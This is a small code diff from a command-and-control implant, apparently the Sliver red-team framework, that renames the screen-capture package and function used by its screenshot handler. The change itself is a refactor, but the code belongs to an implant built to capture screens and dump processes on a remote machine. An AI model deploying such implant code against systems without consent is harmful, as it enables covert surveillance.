@@ -34,7 +34,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/netstat"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
-	screen "github.com/bishopfox/sliver/implant/sliver/sc"
+	"github.com/bishopfox/sliver/implant/sliver/screen"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -221,7 +221,7 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	log.Printf("Screenshot Request")
 	// {{end}}
 
-	sc.Data = screen.Capture()
+	sc.Data = screen.Screenshot()
 	data, err = proto.Marshal(sc)
 
 	resp(data, err)
